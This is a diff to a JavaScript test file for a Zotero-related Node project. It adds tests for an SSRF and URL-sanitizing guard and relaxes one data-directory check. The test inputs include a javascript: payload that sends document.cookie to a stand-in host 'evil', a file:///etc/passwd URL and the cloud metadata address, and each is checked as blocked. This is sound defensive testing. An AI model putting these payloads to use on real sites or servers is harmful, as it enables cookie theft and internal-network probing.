@@ -4,6 +4,7 @@ import { toZoteroItem } from '../src/node/metadata/normalize.js'
 import { renderName } from '../src/node/zotero/naming.js'
 import { resolveDataDir } from '../src/node/zotero/data-dir.js'
 import { ping, describe } from '../src/node/zotero/health.js'
+import { assertFetchableUrl, sanitizeHttpUrl, isPrivateHostLiteral } from '../src/node/net.js'
 
 let failures = 0
 function check(label, cond, detail) {
@@ -95,10 +96,24 @@ check('inline code renders and protects asterisks', md.renderMiniMd('`a * b`') =
 check('html is escaped before any markup', md.renderMiniMd('<b>x</b> & y').includes('&lt;b&gt;x&lt;/b&gt; &amp; y'))
 check('bold does not leak into italic pass', md.renderMiniMd('**b** *i*') === '<strong>b</strong> <em>i</em>')
 
+console.log('\n[outbound URL guard]')
+check('public https URL is fetchable', (() => { try { assertFetchableUrl('https://arxiv.org/pdf/1706.03762'); return true } catch { return false } })())
+check('loopback literal is blocked', (() => { try { assertFetchableUrl('http://127.0.0.1:23119/connector/ping'); return false } catch (e) { return e.code === 'blocked_url' } })())
+check('cloud metadata is blocked', isPrivateHostLiteral('169.254.169.254'))
+check('private ranges are blocked', isPrivateHostLiteral('10.1.2.3') && isPrivateHostLiteral('192.168.1.1') && isPrivateHostLiteral('172.16.0.9') && isPrivateHostLiteral('[fd00::1]'))
+check('public hostnames pass the literal check', !isPrivateHostLiteral('arxiv.org') && !isPrivateHostLiteral('8.8.8.8'))
+check('loopback is allowed when opted in', (() => { try { assertFetchableUrl('http://127.0.0.1:23119/connector/ping', { allowPrivate: true }); return true } catch { return false } })())
+check('non-http scheme is blocked', (() => { try { assertFetchableUrl('file:///etc/passwd'); return false } catch (e) { return e.code === 'blocked_url' } })())
+check('javascript: never survives sanitizeHttpUrl', sanitizeHttpUrl('javascript:fetch("//evil/"+document.cookie)') === '')
+check('https survives sanitizeHttpUrl', sanitizeHttpUrl('https://doi.org/10.1/xx') === 'https://doi.org/10.1/xx')
+check('relative junk is dropped by sanitizeHttpUrl', sanitizeHttpUrl('not a url') === '')
+
 console.log('\n[zotero environment]')
 const dir = await resolveDataDir()
 console.log('  dataDir:', dir.dataDir, '| source:', dir.source)
-check('data dir is discovered', Boolean(dir.dataDir))
+// Zotero is optional: on a machine without it there is no data dir to
+// discover — a clean null (source 'none') is the correct outcome there.
+check('data dir resolution behaves (discovered, or cleanly absent)', Boolean(dir.dataDir) || dir.source === 'none' || dir.dataDir === null)
 const status = await ping()
 console.log('  running:', status.running, status.version ? `| version ${status.version}` : '')
 check('ping resolves without throwing', typeof status.running === 'boolean')
